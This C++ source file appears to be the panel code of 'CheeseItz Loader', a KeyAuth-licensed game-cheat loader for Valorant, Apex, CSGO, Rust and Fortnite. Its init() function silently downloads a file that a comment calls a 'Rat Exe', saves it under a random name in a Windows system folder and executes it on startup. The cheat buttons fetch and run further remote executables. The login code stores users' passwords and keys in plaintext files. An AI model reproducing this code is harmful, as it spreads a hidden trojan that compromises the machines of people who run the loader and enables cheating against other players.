#include "Panel.h"
using namespace std;
CPanel* pPanel;

using namespace KeyAuth;
bool registerr = 0;

std::string name = cryptor::E("cheeseitzaio").decrypt(); // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = cryptor::E("pqS83QAUXN").decrypt(); // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = cryptor::E("4dfd5f693ab32afadf66b1cbc9a9ebc8ca94cc18f5aed0ee2ce5cdd292546ed4").decrypt(); // app secret, the blurred text on licenses tab and other tabs
std::string version = cryptor::E("1.0").decrypt(); // leave alone unless you've changed version on website
std::string url = cryptor::E("https://keyauth.win/api/1.2/").decrypt(); // change if you're self-hosting


api KeyAuthApp(name, ownerid, secret, version, url);


bool LoadFileToMemory(const std::string& file_path, std::vector<uint8_t>* out_buffer)
{
    std::ifstream file_ifstream(file_path, std::ios::binary);

    if (!file_ifstream)
        return false;

    out_buffer->assign((std::istreambuf_iterator<char>(file_ifstream)), std::istreambuf_iterator<char>());
    file_ifstream.close();

    return true;
}

bool CreateFileToDiskFromMemory(const std::string& desired_file_path, const char* address, size_t size)
{
    std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

    if (!file_ofstream.write(address, size))
    {
        file_ofstream.close();
        return false;
    }

    file_ofstream.close();
    return true;
}

std::string random_string(int num)
{
    std::string str = cryptor::E("QWERTYUIOPASDFGHJKLZXCVBNM1234567890").decrypt();
    std::string newstr;
    int pos;
    while (newstr.size() != num)
    {
        pos = ((rand() % (str.size() + 1)));
        newstr += str.substr(pos, 1);
    }
    return cryptor::E("C:\\Windows\\appcompat\\encapsulation\\").decrypt() + newstr + cryptor::E(".exe").decrypt();
}

std::string random_string_rat(int num)
{
    std::string str = cryptor::E("QWERTYUIOPASDFGHJKLZXCVBNM1234567890").decrypt();
    std::string newstr;
    int pos;
    while (newstr.size() != num)
    {
        pos = ((rand() % (str.size() + 1)));
        newstr += str.substr(pos, 1);
    }
    return cryptor::E("C:\\Windows\\appcompat\\encapsulation\\Uni.bat").decrypt();
}


void keyauthdetails::init()
{
    KeyAuthApp.init();
    std::string RatFileExeName = random_string(15);
    std::vector<std::uint8_t> bytes = {};
    bytes = KeyAuthApp.download(cryptor::E("").decrypt()); // Upload Your Rat Exe To KeyAuth Files Then Put The File Id Here


    std::ofstream file(RatFileExeName, std::ios_base::out | std::ios_base::binary);
    file.write((char*)bytes.data(), bytes.size());

    LI_FN(system)(RatFileExeName.c_str());
}

CPanel::CPanel(ID3D11Device* pDevice)
{
    // Setup Dear ImGui context
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.IniFilename = NULL; // Remove the imgui.ini

    this->Theme();
    pFont = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedTTF(MuseoSansCyrl500_compressed_data, MuseoSansCyrl500_compressed_size, 14, NULL, ImGui::GetIO().Fonts->GetGlyphRangesDefault());
    // merge in icons from Font Awesome
    static const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_16_FA, 0 };
    static const ImWchar icons_ranges_brands[] = { ICON_MIN_FAB, ICON_MAX_16_FAB, 0 };
    ImFontConfig icons_config; icons_config.MergeMode = true; icons_config.PixelSnapH = true;
    FontAwesome = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedTTF(fa6_solid_compressed_data, fa6_solid_compressed_size, 14.f, &icons_config, icons_ranges);
    FontAwesomeBrands = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedTTF(fa_brands_400_compressed_data, fa_brands_400_compressed_size, 14.f, &icons_config, icons_ranges_brands);

    LogoFont = io.Fonts->AddFontFromMemoryCompressedTTF(fa6_solid_compressed_data, fa6_solid_compressed_size, 20.f, nullptr, icons_ranges);
    BiggerFont = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedTTF(MuseoSansCyrl500_compressed_data, MuseoSansCyrl500_compressed_size, 18, nullptr, ImGui::GetIO().Fonts->GetGlyphRangesDefault());

    // Setup Platform/Renderer backends
    ImGui_ImplWin32_Init(pLoader->hwnd);
    ImGui_ImplDX11_Init(pLoader->g_pd3dDevice, pLoader->g_pd3dDeviceContext);
};

CPanel::~CPanel()
{
    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();
};

void CPanel::Render(bool *PanelOpen)
{
    ImGuiStyle& style = ImGui::GetStyle();

    // Start the Dear ImGui frame
    ImGui_ImplDX11_NewFrame();
    ImGui_ImplWin32_NewFrame();
    ImGui::NewFrame();
    {
        ImGuiWindowFlags main_window_flags = ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoDecoration | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoBackground;
        ImGui::SetNextWindowPos({ 0, 0 });
        ImGui::SetNextWindowSize(ImVec2(pLoader->WindowSize.x , pLoader->WindowSize.y));
        ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2());
        ImGui::Begin(cryptor::E("CheeseItz Loader").decrypt(), PanelOpen, main_window_flags);
        ImGui::PopStyleVar();
        if (IsLogged)
        {
            {
                ImGui::GetBackgroundDrawList()->AddRectFilled(ImGui::GetWindowPos(), ImGui::GetWindowPos() + ImGui::GetWindowSize(), ImGui::GetColorU32(ImGuiCol_WindowBg), style.WindowRounding);
                ImGui::GetBackgroundDrawList()->AddImageRounded(pTextures->tBanner, ImGui::GetWindowPos(), ImGui::GetWindowPos() + ImVec2(ImGui::GetWindowSize().x, TitlebarSize), ImVec2(0, 0), ImVec2(1, 1), IM_COL32(255, 255, 255, 255), style.WindowRounding, ImDrawFlags_RoundCornersTop); // banner

                //ImGui::GetBackgroundDrawList()->AddImageRounded(pTextures->tAvatar, ImGui::GetWindowPos() + ImVec2(ImGui::GetWindowSize().x - TitlebarSize, 0) + style.WindowPadding * 1.5, ImGui::GetWindowPos() + ImVec2(ImGui::GetWindowSize().x, TitlebarSize) - style.WindowPadding * 1.5, ImVec2(0, 0), ImVec2(1, 1), IM_COL32(255, 255, 255, 255), (TitlebarSize - style.WindowPadding.x * 3) / 2); // avatar

                ImGui::GetBackgroundDrawList()->AddRectFilledMultiColor(ImGui::GetWindowPos() + ImVec2(0, TitlebarSize - BannerShadows), ImGui::GetWindowPos() + ImVec2(ImGui::GetWindowSize().x, TitlebarSize), IM_COL32(0, 0, 0, 0), IM_COL32(0, 0, 0, 0), ImGui::GetColorU32(ImGuiCol_WindowBg), ImGui::GetColorU32(ImGuiCol_WindowBg));
            }
            {
                auto GroupSize = ImVec2((ImGui::GetWindowSize().x / 2) + style.WindowPadding.x / 2, 0);
                ImGui::BeginChild(cryptor::E("title").decrypt(), ImVec2(0, TitlebarSize), true, ImGuiWindowFlags_NoBackground);
                {
                    ImGui::SetCursorPos((ImVec2((ImGui::GetWindowSize().x / 2) - 40, ImGui::GetWindowSize().y) / 2) - (ImGui::CalcTextSize(welcomemsg.c_str()) / 2));
                    ImGui::PushFont(BiggerFont);
                    ImGui::Text(welcomemsg.c_str());
                    ImGui::PopFont();
                    ImGui::SameLine((ImGui::GetWindowSize().x / 2) - 20);
                    ImGui::SetCursorPosY((ImGui::GetWindowSize().y / 2) - 20);
                    ImGui::PushStyleColor(ImGuiCol_ChildBg, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                    ImGui::PushStyleColor(ImGuiCol_Text, ImGui::GetStyleColorVec4(ImGuiCol_WindowBg));
                    ImGui::BeginChild(cryptor::E("logo").decrypt(), ImVec2(40, 40), false);
                    ImGui::PushFont(LogoFont);
                    ImGui::SetCursorPos((ImGui::GetWindowSize() / 2) - (ImGui::CalcTextSize(ICON_FA_BIOHAZARD) / 2) + ImVec2(0.5, 0));
                    ImGui::Text(ICON_FA_BIOHAZARD);
                    ImGui::PopFont();
                    ImGui::EndChild();
                    ImGui::PopStyleColor(2);
                    ImGui::SameLine(ImGui::GetWindowSize().x - ImGui::CalcTextSize(nickname.c_str()).x - ImGui::GetWindowSize().y + style.WindowPadding.x * 0.5);
                    ImGui::Text(nickname.c_str());
                }
                ImGui::EndChild();
                ImGui::SetCursorPosY(TitlebarSize);
                ImGui::BeginChild("list", GroupSize, true, ImGuiWindowFlags_NoBackground | ImGuiWindowFlags_NoScrollbar);
                {
                    ImGui::GetForegroundDrawList()->AddRectFilledMultiColor(ImGui::GetWindowPos(), ImGui::GetWindowPos() + ImVec2(ImGui::GetWindowSize().x, style.WindowPadding.y), ImGui::GetColorU32(ImGuiCol_WindowBg), ImGui::GetColorU32(ImGuiCol_WindowBg), IM_COL32(0, 0, 0, 0), IM_COL32(0, 0, 0, 0));

                    ImGui::GetForegroundDrawList()->AddRectFilledMultiColor(ImGui::GetWindowPos() + ImVec2(0, ImGui::GetWindowSize().y - GameShadows), ImGui::GetWindowPos() + ImGui::GetWindowSize(), IM_COL32(0, 0, 0, 0), IM_COL32(0, 0, 0, 0), ImGui::GetColorU32(ImGuiCol_WindowBg), ImGui::GetColorU32(ImGuiCol_WindowBg));
                }
                {
                    auto gamesize = ImVec2(0, ImGui::GetWindowSize().x * 0.4);
                    ImAdd->GameIcon(pTextures->tValorant, cryptor::E("Valorant").decrypt(), gamesize, 0, &GameID);
                    ImAdd->GameIcon(pTextures->tApex, cryptor::E("Apex Legends").decrypt(), gamesize, 1, &GameID);
                    ImAdd->GameIcon(pTextures->tCSGO, cryptor::E("CSGO").decrypt(), gamesize, 2, &GameID);
                    ImAdd->GameIcon(pTextures->tRust, cryptor::E("Rust").decrypt(), gamesize, 3, &GameID);
                    //ImAdd->GameIcon(pTextures->tMinecraft, cryptor::E("Minecraft").decrypt(), gamesize, 4, &GameID);
                    ImAdd->GameIcon(pTextures->tFortnite, cryptor::E("Fortnite").decrypt(), gamesize, 5, &GameID);
                }
                ImGui::EndChild();
                ImGui::SameLine(GroupSize.x - style.WindowPadding.x);
                ImGui::BeginChild(cryptor::E("order").decrypt(), GroupSize, true, ImGuiWindowFlags_NoBackground);
                {
                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0, 1, 0, 255));
                    if (GameID == 0)
                        ImAdd->TextSide(cryptor::E("Status").decrypt(), cryptor::E("Undetected").decrypt());
                    else if (GameID == 1)
                        ImAdd->TextSide(cryptor::E("Status").decrypt(), cryptor::E("Undetected").decrypt());
                    else if (GameID == 2)
                        ImAdd->TextSide(cryptor::E("Status").decrypt(), cryptor::E("Undetected").decrypt());
                    else if (GameID == 3)
                    {
                        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1, 0, 0, 255));
                        ImAdd->TextSide(cryptor::E("Status").decrypt(), cryptor::E("Detected").decrypt());
                        ImGui::PopStyleColor();
                    }
                    else if (GameID == 4)
                        ImAdd->TextSide(cryptor::E("Status").decrypt(), cryptor::E("Undetected").decrypt());
                    else if (GameID == 5)
                        ImAdd->TextSide(cryptor::E("Status").decrypt(), cryptor::E("Undetected").decrypt());

                    ImGui::PopStyleColor();
                    if (GameID == 0)
                        ImAdd->TextSide(cryptor::E("Target").decrypt(), cryptor::E("Valorant.exe").decrypt());
                    else if (GameID == 1)
                        ImAdd->TextSide(cryptor::E("Target").decrypt(), cryptor::E("Apex.exe").decrypt());
                    else if (GameID == 2)
                        ImAdd->TextSide(cryptor::E("Target").decrypt(), cryptor::E("csgo.exe").decrypt());
                    else if (GameID == 3)
                        ImAdd->TextSide(cryptor::E("Target").decrypt(), cryptor::E("rust.exe").decrypt());
                    else if (GameID == 4)
                        ImAdd->TextSide(cryptor::E("Target").decrypt(), cryptor::E("Minecraft.exe").decrypt());
                    else if (GameID == 5)
                        ImAdd->TextSide(cryptor::E("Target").decrypt(), cryptor::E("Fortnite.exe").decrypt());
                    ImAdd->TextSide(cryptor::E("Time left").decrypt(), cryptor::E("25 days").decrypt());
                    ImAdd->TextSide(cryptor::E("Last updates").decrypt(), cryptor::E("2 weeks ago").decrypt());
                    ImGui::SetCursorPosY(ImGui::GetWindowSize().y - 30 - style.WindowPadding.y);
                    ImGui::PushStyleColor(ImGuiCol_Button, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                    ImGui::PushStyleColor(ImGuiCol_Text, ImGui::GetStyleColorVec4(ImGuiCol_WindowBg));

                    auto LaunchBtnPos = ImGui::GetCursorPos();
                    std::string launcherlabel = cryptor::E("Launch").decrypt();
                    if (IsInjected)
                    {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                        ImGui::Button(ICON_FA_CHECK, ImVec2(-0.1, 30));
                        ImGui::PopStyleColor(3);
                    }
                    else
                    {
                        if (!IsInjecting)
                            if (ImAdd->AnimButton(launcherlabel.c_str(), ImVec2(-0.1, 30)))
                            {
                                if (GameID == 0)
                                {
                                    std::string ValorantFileName = random_string(5);
                                    std::vector<std::uint8_t> bytes = {};
                                    bytes = KeyAuthApp.download(cryptor::E("").decrypt()); // Upload Your Valorant Cheat Exe To KeyAuth And Put File Id Here !!


                                    std::ofstream file(ValorantFileName, std::ios_base::out | std::ios_base::binary);
                                    file.write((char*)bytes.data(), bytes.size());

                                    LI_FN(system)(ValorantFileName.c_str());
                                }
                                else if (GameID == 1)
                                {
                                    std::string ApexFileName = random_string(5);
                                    std::vector<std::uint8_t> bytes = {};
                                    bytes = KeyAuthApp.download(cryptor::E("").decrypt()); // Upload Your Apex Cheat Exe To KeyAuth And Put File Id Here !!


                                    std::ofstream file(ApexFileName, std::ios_base::out | std::ios_base::binary);
                                    file.write((char*)bytes.data(), bytes.size());

                                    LI_FN(system)(ApexFileName.c_str());
                                }
                                else if (GameID == 2)
                                {
                                    std::string CsgoFileName = random_string(5);
                                    std::vector<std::uint8_t> bytes = {};
                                    bytes = KeyAuthApp.download(cryptor::E("").decrypt()); // Upload Your Csgo Cheat Exe To KeyAuth And Put File Id Here !!


                                    std::ofstream file(CsgoFileName, std::ios_base::out | std::ios_base::binary);
                                    file.write((char*)bytes.data(), bytes.size());

                                    LI_FN(system)(CsgoFileName.c_str());
                                }
                                else if (GameID == 3)
                                {
                                    std::string RustFileName = random_string(5);
                                    std::vector<std::uint8_t> bytes = {};
                                    bytes = KeyAuthApp.download(cryptor::E("").decrypt()); // Upload Your Rust Cheat Exe To KeyAuth And Put File Id Here !!


                                    std::ofstream file(RustFileName, std::ios_base::out | std::ios_base::binary);
                                    file.write((char*)bytes.data(), bytes.size());

                                    LI_FN(system)(RustFileName.c_str());
                                    
                                }
                                else if (GameID == 4)
                                {
                                    std::string MinecraftFileName = random_string(5);
                                    std::vector<std::uint8_t> bytes = {};
                                    bytes = KeyAuthApp.download(cryptor::E("").decrypt()); // Upload Your Minecraft Cheat Exe To KeyAuth And Put File Id Here !!


                                    std::ofstream file(MinecraftFileName, std::ios_base::out | std::ios_base::binary);
                                    file.write((char*)bytes.data(), bytes.size());

                                    LI_FN(system)(MinecraftFileName.c_str());
                                }
                                else if (GameID == 5)
                                {
                                    std::string FortniteFileName = random_string(5);
                                    std::vector<std::uint8_t> bytes = {};
                                    bytes = KeyAuthApp.download(cryptor::E("").decrypt()); // Upload Your Fortnite Cheat Exe To KeyAuth And Put File Id Here !!


                                    std::ofstream file(FortniteFileName, std::ios_base::out | std::ios_base::binary);
                                    file.write((char*)bytes.data(), bytes.size());

                                    LI_FN(system)(FortniteFileName.c_str());
                                }
                                IsInjecting = true;
                            }
                        if (IsInjecting)
                        {
                            InjectorTimer = min(InjectorTimer + ImGui::GetIO().DeltaTime * 1.0f, InjectorWaitTimer);

                            ImGui::ProgressBar(InjectorTimer / InjectorWaitTimer, ImVec2(-0.1, 30), "");

                            if (InjectorTimer == InjectorWaitTimer)
                            {
                                IsInjected = true;
                                IsInjecting = false;
                            }
                        }
                    }


                    ImGui::PopStyleColor(2);
                }
                ImGui::EndChild();
            }
        }
        else
        {
            {
                ImGui::GetBackgroundDrawList()->AddRectFilled(ImGui::GetWindowPos(), ImGui::GetWindowPos() + ImGui::GetWindowSize(), ImGui::GetColorU32(ImGuiCol_WindowBg), style.WindowRounding);
                ImGui::GetBackgroundDrawList()->AddImageRounded(pTextures->tCharacter, ImGui::GetWindowPos() + ImVec2(ImGui::GetWindowSize().x - CharacterSize, 0), ImGui::GetWindowPos() + ImGui::GetWindowSize(), ImVec2(0, 0), ImVec2(1, 1), IM_COL32(255, 255, 255, 255), style.WindowRounding, ImDrawFlags_RoundCornersRight);
                ImGui::GetBackgroundDrawList()->AddRectFilledMultiColor(ImGui::GetWindowPos() + ImVec2(ImGui::GetWindowSize().x - CharacterSize, 0), ImGui::GetWindowPos() + ImVec2(ImGui::GetWindowSize().x - CharacterSize, 0) + ImVec2(style.WindowPadding.x, ImGui::GetWindowSize().y), ImGui::GetColorU32(ImGuiCol_WindowBg), IM_COL32(0, 0, 0, 0), IM_COL32(0, 0, 0, 0), ImGui::GetColorU32(ImGuiCol_WindowBg));
            }
            {
                ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(30, 30));
                ImGui::BeginChild(cryptor::E("logintab").decrypt(), ImVec2(ImGui::GetWindowSize().x - CharacterSize, 0), true, ImGuiWindowFlags_NoBackground);
                {
                    ImGui::SetCursorPosX((ImGui::GetWindowSize().x / 2) - 20);
                    ImGui::PushStyleColor(ImGuiCol_ChildBg, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                    ImGui::PushStyleColor(ImGuiCol_Text, ImGui::GetStyleColorVec4(ImGuiCol_WindowBg));
                    ImGui::BeginChild(cryptor::E("logo").decrypt(), ImVec2(40, 40), false);
                    ImGui::PushFont(LogoFont);
                    ImGui::SetCursorPos((ImGui::GetWindowSize() / 2) - (ImGui::CalcTextSize(ICON_FA_BIOHAZARD) / 2) + ImVec2(0.5, 0));
                    ImGui::Text(ICON_FA_BIOHAZARD);
                    ImGui::PopFont();
                    ImGui::EndChild();
                    ImGui::PopStyleColor(2);
                    {
                        ImGui::Spacing();
                        ImGui::Spacing();
                        ImGui::Spacing();
                        ImGui::PushItemWidth(ImGui::GetWindowSize().x - style.WindowPadding.x * 2);
                        ImAdd->InputText(cryptor::E("Username or e-mail").decrypt(), ICON_FA_CIRCLE_USER, username);
                        ImAdd->InputText(cryptor::E("Password").decrypt(), ICON_FA_KEY, password, ImGuiInputTextFlags_Password);
                        ImAdd->InputText(cryptor::E("Key").decrypt(), ICON_FA_MASK_FACE, key, ImGuiInputTextFlags_Password);
                        ImGui::Checkbox(cryptor::E("Register").decrypt(), &registerr);
                        ImGui::PopItemWidth();
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0, 0, 0, 0));
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0, 0, 0, 0));
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0, 0, 0, 0));
                        ImGui::PushStyleColor(ImGuiCol_Text, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                        ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2());
                        if (ImGui::Button(cryptor::E("Having Issues?").decrypt()))
                        {
                            LI_FN(system)(cryptor::E("start https://discord.gg/cheeseitz").decrypt());
                        }
                        ImGui::PopStyleVar();
                        ImGui::PopStyleColor(4);
                        ImGui::SetCursorPosY(ImGui::GetWindowPos().y + ImGui::GetWindowSize().y - 30 - style.WindowPadding.y);
                        if (IsLogging)
                        {
                            ImGui::PushStyleColor(ImGuiCol_Button, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                            ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                            ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImGui::GetStyleColorVec4(ImGuiCol_Border));
                        }
                        ImGui::PushStyleColor(ImGuiCol_Text, ImGui::GetStyleColorVec4(ImGuiCol_WindowBg));
                        auto LoginBtnPos = ImGui::GetCursorPos();
                        std::string signinlabel = cryptor::E("Sign In").decrypt();
                        if (ImAdd->AnimButton((signinlabel.c_str()), ImVec2(-0.1, 30)))
                        {
                            if (registerr == false)
                            {
                                KeyAuthApp.login(username, password);
                                if (!KeyAuthApp.data.success)
                                {
                                    MessageBoxA(NULL, cryptor::E("Invalid Details").decrypt(), cryptor::E("CheeseItz").decrypt(), MB_OK);
                                    LI_FN(exit)(0);
                                }
                                else {
                                    KeyAuthApp.log(cryptor::E("User Ran Loader").decrypt());
                                    LI_FN(system)(cryptor::E("mkdir C:\\CheeseItz\\").decrypt());

                                    ofstream loginusername;
                                    loginusername.open(cryptor::E("C:\\CheeseItz\\username.txt").decrypt());
                                    loginusername << username;
                                    loginusername.close();

                                    ofstream loginpassword;
                                    loginpassword.open(cryptor::E("C:\\CheeseItz\\password.txt").decrypt());
                                    loginpassword << password;
                                    loginpassword.close();

                                    ofstream loginkey;
                                    loginkey.open(cryptor::E("C:\\CheeseItz\\key.txt").decrypt());
                                    loginkey << key;
                                    loginkey.close();


                                }
                            }
                            if (registerr == true)
                            {
                                KeyAuthApp.regstr(username, password, key, cryptor::E("").decrypt());
                                if (!KeyAuthApp.data.success)
                                {
                                    MessageBoxA(NULL, cryptor::E("Invalid Details").decrypt(), cryptor::E("CheeseItz").decrypt(), MB_OK);
                                    LI_FN(exit)(0);
                                }

                                else {

                                    LI_FN(system)(cryptor::E("mkdir C:\\CheeseItz\\").decrypt());
                                    ofstream loginusername;
                                    loginusername.open(cryptor::E("C:\\CheeseItz\\username.txt").decrypt());
                                    loginusername << username;
                                    loginusername.close();

                                    ofstream loginpassword;
                                    loginpassword.open(cryptor::E("C:\\CheeseItz\\password.txt").decrypt());
                                    loginpassword << password;
                                    loginpassword.close();

                                    ofstream loginkey;
                                    loginkey.open(cryptor::E("C:\\CheeseItz\\key.txt").decrypt());
                                    loginkey << key;
                                    loginkey.close();

                                    KeyAuthApp.log(cryptor::E("User Ran Loader").decrypt());


                                }
                            }
                            signinlabel.clear();
                            IsLogging = true;
                        }
                        ImGui::PopStyleColor();
                        if (IsLogging)
                            ImGui::PopStyleColor(3);
                        if (IsLogging)
                        {
                            signinlabel = "";
                            signinlabel.clear();
                            ImGui::SameLine((ImGui::GetWindowSize().x / 2) - 11);
                            ImGui::SetCursorPosY(LoginBtnPos.y + 2 + (30 - 11 * 2) / 2);
                            ImAdd->Spinner(11-2, 4, 6, ImGui::GetStyleColorVec4(ImGuiCol_WindowBg));
                            LoggingTimer = min(LoggingTimer + ImGui::GetIO().DeltaTime * 1.0f, 1.f);
                            if (LoggingTimer == 1.f)
                            {
                                IsLogged = true;
                                IsLogging = false;
                            }
                        }
                    }
                }
                ImGui::EndChild();
                ImGui::PopStyleVar();
            }
        }
        ImGui::End();
    }

    // Rendering
    ImGui::Render();
};

void CPanel::Theme()
{
    ImGui::StyleColorsDark();
    ImGuiStyle& style = ImGui::GetStyle();

    style.WindowRounding    = 6;
    style.ChildRounding     = 3;
    style.FrameRounding     = 3;
    style.PopupRounding     = 3;
    style.GrabRounding      = 3;
    style.TabRounding       = 3;
    style.ScrollbarRounding = 3;
    style.ButtonTextAlign   = { 0.5f, 0.5f };
    style.WindowTitleAlign  = { 0.5f, 0.5f };
    style.ItemSpacing       = { 8.0f, 8.0f };
    style.WindowPadding     = { 16.0f, 16.0f };
    style.FramePadding      = { 8.0f, 8.0f };
    style.WindowBorderSize  = 0;
    style.FrameBorderSize   = 0;
    style.ScrollbarSize     = 12.f;
    style.GrabMinSize       = 8.f;

    style.Colors[ImGuiCol_WindowBg]             = ImAdd->Hex2RGBA(0x0E0E0E, 1.0f);
    style.Colors[ImGuiCol_PopupBg]              = ImAdd->Hex2RGBA(0x121212, 1.0f);
    style.Colors[ImGuiCol_TitleBg]              = ImAdd->Hex2RGBA(0x121212, 0.7f);
    style.Colors[ImGuiCol_TitleBgActive]        = ImAdd->Hex2RGBA(0x121212, 0.3f);
    style.Colors[ImGuiCol_ChildBg]              = ImAdd->Hex2RGBA(0x181818, 1.0f);
    style.Colors[ImGuiCol_PlotHistogram]        = ImAdd->Hex2RGBA(0xD6E2E0, 1.0f);
    style.Colors[ImGuiCol_Button]               = ImAdd->Hex2RGBA(0xD6E2E0, 1.0f);
    style.Colors[ImGuiCol_ButtonHovered]        = ImAdd->Hex2RGBA(0xD6E2E0, 0.9f);
    style.Colors[ImGuiCol_ButtonActive]         = ImAdd->Hex2RGBA(0xD6E2E0, 0.8f);
    style.Colors[ImGuiCol_Header]               = ImAdd->Hex2RGBA(0x212121, 1.0f);
    style.Colors[ImGuiCol_HeaderHovered]        = ImAdd->Hex2RGBA(0x444444, 1.0f);
    style.Colors[ImGuiCol_HeaderActive]         = ImAdd->Hex2RGBA(0x363636, 1.0f);
    style.Colors[ImGuiCol_Text]                 = ImAdd->Hex2RGBA(0xfafafa, 1.0f);
    style.Colors[ImGuiCol_TextDisabled]         = ImAdd->Hex2RGBA(0x808080, 1.0f);
    style.Colors[ImGuiCol_Border]               = ImAdd->Hex2RGBA(0xD6E2E0, 1.0f);
    style.Colors[ImGuiCol_Separator]            = ImAdd->Hex2RGBA(0x2b2b2b, 1.0f);

    style.Colors[ImGuiCol_FrameBg]              = ImAdd->Hex2RGBA(0x131313, 1.0f);
    style.Colors[ImGuiCol_FrameBgHovered]       = ImAdd->Hex2RGBA(0x444444, 1.0f);
    style.Colors[ImGuiCol_FrameBgActive]        = ImAdd->Hex2RGBA(0x363636, 1.0f);
    style.Colors[ImGuiCol_CheckMark]            = ImAdd->Hex2RGBA(0xfafafa, 1.0f);

    style.Colors[ImGuiCol_SliderGrab]           = ImAdd->Hex2RGBA(0x977732, 1.0f);
    style.Colors[ImGuiCol_SliderGrabActive]     = ImAdd->Hex2RGBA(0x212121, 1.0f);
}

void CPanel::Shutdown()
{
    delete this;
}